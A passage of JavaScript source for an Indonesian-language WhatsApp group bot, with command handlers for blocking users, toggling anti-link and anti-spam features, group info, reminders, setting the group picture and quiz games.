if (!isGroup) return setReply("Hanya bisa di group")
asu = iky.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
await ikyc.blockUser(Nomer, "add")
await addBlock(Nomer, blocked)
await setReply( `Berhasil block ${Nomer.split("@")[0]}`);
    
 } else if(iky.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
await ikyc.blockUser(ahah, "add")
await addBlock(ahah, blocked)
await setReply(`${ahah.split("@")[0]} berhasil di block`);
   } else{
 setReply(`Kirim perintah ${prefix}block @tag atau nomor atau reply pesan orang yang ingin di block`)
 }
break    


case 'unblock':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await ikyc.blockUser(woke, "remove")
await unBlock(woke, blocked)
await setReply( `Sukses unblock ${woke.split("@")[0]}`);
    
} else if (iky.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
asu = iky.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
await ikyc.blockUser(Nomer, "remove")
await unBlock(Nomer, blocked)
await setReply( `Berhasil unblock ${Nomer.split("@")[0]}`);
    
 } else if(iky.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = iky.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
await ikyc.blockUser(ahah, "remove")
await unBlock(ahah, blocked)
await setReply(`${ahah.split("@")[0]} berhasil di unblock`);
   } else{
 setReply(`Kirim perintah ${prefix}unblock @tag atau nomor atau reply pesan orang yang ingin di block`)
 }
break    






    
    case 'welcome':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
                    if(isZadani) return
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isWelkom) return setReply('Fitur welcome sudah aktif kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah aktif`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isWelkom) return setReply('Udah mati')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah di matikan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}welcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}welcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;                 







                 
                 case 'antidel':
                 case 'antidelete':
    if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
                    if(isZadani) return
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntidel) return setReply('Fitur welcome sudah aktif kak')
						antidel.push(from)
						fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
						let ih =`Fitur anti delete telah aktif`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntidel) return setReply('Udah mati')
						antidel.splice(from, 1)
						fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))
						let ih =`Fitur anti delete telah di matikan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI DELETE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antidel on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antidel off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;    
                 case 'antiwame':				
	       if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (args[0] === 'on') {
						if (isAntiWame) return reply('Sudah Aktif Kak')
						antiwame.push(from)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
						reply('Sukses mengaktifkan fitur antiwame')
						ikyc.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti wa.me\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntiWame) return reply('Sudah Mati Kak')
						var ini = antiwame.indexOf(from)
						antiwame.splice(ini, 1)
						fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
						reply('Sukses menonaktifkan fitur antiwame')
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI WA ME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antiwame on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antiwame off`, buttonText: { displayText: Off },type: 1}]);
                    }
					break     
					  
					case 'antibatu':				
	        if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (args[0] === 'on') {
						if (isAntiBatu) return reply('Sudah Aktif Kak')
						antibatu.push(from)
						fs.writeFileSync('./database/antibatu.json', JSON.stringify(antibatu))
						reply('Sukses mengaktifkan fitur antibatu')
						ikyc.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti emot Batu🗿\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
						if (!isAntiBatu) return reply('Sudah Mati Kak')
						var ini = antibatu.indexOf(from)
						antibatu.splice(ini, 1)
						fs.writeFileSync('./database/antibatu.json', JSON.stringify(antibatu))
						reply('Sukses menonaktifkan fitur antibatu')
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI EMOT BATU 🗿🪨🪦`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibatu on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibatu off`, buttonText: { displayText: Off },type: 1}]);
                    }
					break       									
      case 'antilinkgc':
      if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
						linkgcnya.push(from);
						fs.writeFileSync("./database/gcdetec.json", JSON.stringify(linkgcnya))
						let ih =`Fitur antilink group telah di aktifkan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntilinkGc) return setReply('Udah mati')
						linkgcnya.splice(from, 1);
						fs.writeFileSync("./database/gcdetec.json", JSON.stringify(linkgcnya))
						let ih =`Fitur antilink group telah di matikan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
    
    case 'antilink':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntiLink) return setReply('Fitur sudah aktif kak')
						antilink.push(from);
						fs.writeFileSync("./database/antilink.json", JSON.stringify(antilink))
						let ih =`Fitur antilink telah di aktifkan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntiLink) return setReply('Udah mati')
						antilink.splice(from, 1);
						fs.writeFileSync("./database/antilink.json", JSON.stringify(antilink))
						let ih =`Fitur antilink telah di matikan`
                    ikyc.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
    
    
    
    
    




					
					
					case "antivirtex":
	    if(isZadani) return
		if (!isGroupAdmins) return sendSticker(hanyaadmin)
        if (!isGroup) return setReply('Kusus group')
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
        if (AntiVirtex) return setReply('Sudah Aktif')
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          setReply("Sukses mengaktifkan antivirtex!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!AntiVirtex) return setReply('Sudah Mati')
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(antivirtex));
          setReply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
        


  
  	
        case 'kickarea': // Anti Banned
        if(!isGroup) return setReply("Hanya bisa di group")
        await setReply("_Prosses_")
        for (let i of groupMembers){
        if(i.jid.includes("+1")){
    	await ikyc.groupRemove(from, [i.jid.includes("+1")]);
         }
         }
        break
case 'tips':
   reply(`◪𝙏𝙄𝙋𝙎 𝘽𝙊𝙏
  ├─ ❏ 𝙐𝙉𝙏𝙐𝙆 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝘿𝘼𝙉 𝙇𝘼𝙄𝙉²
  ├─ ➤ Ketik .antilink untuk mengaktifkan fitur penjagaan NOTE (BOT HARUS MENJADI ADMIN)
  ├─ ❏ 𝙐𝙉𝙏𝙐𝙆 𝙈𝙀𝙉𝘼𝙈𝙋𝙄𝙇𝙆𝘼𝙉 𝙈𝙀𝙉𝙐
  ├─ ➤ Ketik .menu untuk menampilkan menubot dll
  ├─ ❏ 𝙐𝙉𝙏𝙐𝙆 𝙈𝙀𝙇𝙄𝙃𝘼𝙏 𝙊𝙒𝙉𝙀𝙍
  ├─ ➤ Ketik .owner untuk bertanya² seputar bot
  ├─ ❏ 𝙐𝙉𝙏𝙐𝙆 𝙒𝙀𝙇𝘾𝙊𝙈𝙀
  ├─ ➤ Ketik .welcome untuk memberi sambutan kepada member baru
  ├─ ❏ 𝙐𝙉𝙏𝙐𝙆 𝙁𝙄𝙏𝙐𝙍 𝙔𝘼𝙉𝙂 𝘽𝙐𝙂
  └─ ➤Ketik .report untuk memberitahu bug`)

              break
        case "antiasing":
      if (!isGroup) return setReply('Kusus group')
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isKickarea) return setReply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          setReply("Sukses mengaktifkan kickarea!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          setReply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
					
					
					
					
					
					



    
    
    
    
    case 'getppgc':
					if (!isGroup) return 
					setReply(mess.wait)
					ahenak = from
		if (`${ahenak}@g.us`) {
		try {
					ppimg = await ikyc.getProfilePicture(ahenak)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await ikyc.groupMetadata(ahenak)
				uh = await ikyc.getProfilePicture(ahenak)
				buffer = await getBuffer(uh)
				ikyc.sendMessage(from, buffer, image, {quoted: iky})
		} 
  break
  
  
									
									
									
									case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return setReply(mess.only.group)
									if (!isSewa) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
									setReply(sewenye)
									break
									
    
    
             
    
    
    
    case 'infogc':
           case 'infogrup':
            case 'infogroup':
            case 'grupinfo':
            case 'groupinfo':
                if (!isGroup) return setReply('Hanya bisa di dalam group')
                 
                try {
                    var pic = await ikyc.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                
                let ingfo = `
*G R O U P I N F O*
*Name :* ${groupName}
*ID Grup :* ${from}
*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Jumlah Admin :* ${groupAdmins.length}
*Jumlah Peserta :* ${groupMembers.length}
*AntiLink :* ${isAntiLink ? 'ON' : 'OFF'}
*AntiWame :* ${isAntiWame ? 'ON' : 'OFF'}
*AntiViewOnce :* ${isAntiviewonce ? 'ON' : 'OFF'}
*AntiBadword :* ${Toxic ? 'ON' : 'OFF'}
*Antibuggc :* ${Antibuggc ? 'ON' : 'OFF'}
*Antibatu :* ${antibatu ? 'ON' : 'OFF'}
*Antiasing :* ${isKickarea ? 'ON' : 'OFF'}
*Antivirtex :* ${AntiVirtex ? 'ON' : 'OFF'}
*Desc :* \n${groupMetadata.desc}`
                ikyc.sendMessage(from, ingfo, text, {
                    'contextInfo': {  
                        'text': '🔥',
                        'forwardingScore': 10000000,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title':`${groupName}`,
                            'body': '',
                            'previewType': 'PHOTO',
                           
                            'thumbnail': await getBuffer(pic),
                            'sourceUrl': ''
                        }
                    }
             })
                break
           
                            
                          
           case 'getidgc':
           if(!isGroup) return setReply("Hanya bisa di group")
           setReply(`${from}`)
           break
    
    case "reminder": // by Slavyan
        if (!q)
         return setReply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );

        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await ikyc.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              ikyc.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(iky).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await ikyc.downloadAndSaveMediaMessage(encmedia);
          await ikyc.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              ikyc.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              ikyc.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(iky).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : iky;
          media = await ikyc.downloadAndSaveMediaMessage(encmedia);
          await ikyc.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              ikyc.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(iky).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await ikyc.downloadAndSaveMediaMessage(encmedia);
          await ikyc.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              yamete = await reminder.getReminderMsg(sender, _reminder);
              ikyc.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              ikyc.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
           
    
    
       //------------------< Enable / Disable >-------------------
            case 'antibadword':
            case 'antitoxic':
                 if(isZadani) return
                if (!isGroup) return setReply('Hanya bisa di group')
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                    if (Toxic) return setReply(`Udah aktif`)
                    grupbadword.push(from)
					fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
					setReply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                    yahu = grupbadword.indexOf(from)
                    grupbadword.splice(yahu, 1)
                    fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
                    setReply('antibadword grup nonaktif')
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI BADWORD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
    
    
    
    
    
    
    
    
    
    
    case 'setppgrup': 
    case 'setppgc':
									if (!isGroup) return setReply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
									if (!isBotGroupAdmins) return setReply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
										let media = await ikyc.downloadMediaMessage(encmedia)
										ikyc.updateProfilePicture(from, media)
										//.then((res) => setReply(jsonformat(res)))
										//.catch((err) => setReply(jsonformat(err)))
										} else if (isQuotedSticker){
											if (iky.message.videoMessage) return setReply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await ikyc.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return setReply('Eror Lord')
												buffer = fs.readFileSync(ran)
												ikyc.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												setReply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
    
    
 case 'notif':
if (isBanned) return reply(mess.banned)
ikyc.updatePresence(from, Presence.composing)
teks = `Notif dari @${sender.split("@")[0]}\nJam : ${timeWib}\nPesan : ${body.slice(7)}`
group = await ikyc.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: iky
} 
await ikyc.sendMessage(from, options, text)
break   
    

    
    
    case 'caklontong': case 'ckl':{
                    if (!isGroup) return setReply(mess.only.group)
                    if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                    if (game.isCkl(from, caklontong)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/caklontong.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : ${randKey.result.soal}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.result.jawaban.toLowerCase()
                    game.addckl(from, ikasayank, gamewaktu, caklontong)
                    gameAdd(sender, glimit)
                     }
                    break
    
    
    
    
    case 'family100':{
                      if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                      if (!isGroup) return setReply(mess.only.group)
                      if (game.isfam(from, family100)) return setReply(`Masih ada soal yang belum di selesaikan`)
                      data = fs.readFileSync('./lib/game/family100.js');
				      fami = JSON.parse(data);
				      ly100 = Math.floor(Math.random() * fami.length);
				      randKey = fami[ly100];
				      Pertanyaan = randKey.result.soal
                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${Pertanyaan}\n*Total Jawaban :* ${randKey.result.jawaban.length }\n\nWaktu : ${gamewaktu} detik`)
                      let anoh = randKey.result.jawaban
                      let rgfds = []
                      for (let i of anoh){
                      let fefs = i.split('/') ? i.split('/')[0] : i
                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                      rgfds.push(axsf.toLowerCase())
                        }
                       game.addfam(from, rgfds, gamewaktu, family100)
                       gameAdd(sender, glimit)
                         }
                         break
    
    
    

           case 'tebakbendera': case 'tb':{
                     if (!isGroup) return setReply(mess.only.group)
                     if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                     if (game.isTebakBendera(from, tebakbendera)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakbendera.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : Bendera negara manakah itu ${randKey.bendera}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.jawaban.toLowerCase()
                    game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
                    gameAdd(sender, glimit)
                     }
                    break           
           
           case 'tebakgambar':{
                  if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                  if (!isGroup) return setReply(mess.only.group)
                  setReply(mess.wait)
                  if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
                 data = fs.readFileSync('./lib/game/tebakgambar.js');
				  jsonData = JSON.parse(data);
				  randIndex = Math.floor(Math.random() * jsonData.length);
				  randKey = jsonData[randIndex];
                  const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                  sendMediaURL(from, randKey.result.soalImg, monospace(`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu} detik`), iky)
                  let anih = randKey.result.jawaban.toLowerCase()
                  game.addgambar(from, anih, gamewaktu, tebakgambar)
                  gameAdd(sender, glimit)
	               }
                   break  	 
           
           
           case 'tebaklirik': case 'tl':{
                      if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                      if (!isGroup) return setReply(mess.only.group)
                      if (game.isTebakLirik(from, tebaklirik)) return setReply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/tebaklirik.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];      
                      const petunjuk = randKey.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                      let anal = randKey.result.answer.toLowerCase()
                      game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
                      gameAdd(sender, glimit)
                        }
                      break 
           
           case 'siapaaku': case 'siapakahaku': case 'sa':{
                     if (isGame(sender, isOwner, gcount, glimit)) return setReply(`Limit game kamu sudah habis`)
                     if (!isGroup) return setReply(mess.only.group)
                     if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/siapaaku.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];
                     setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.data.soal}\n\nWaktu : ${gamewaktu}s`)
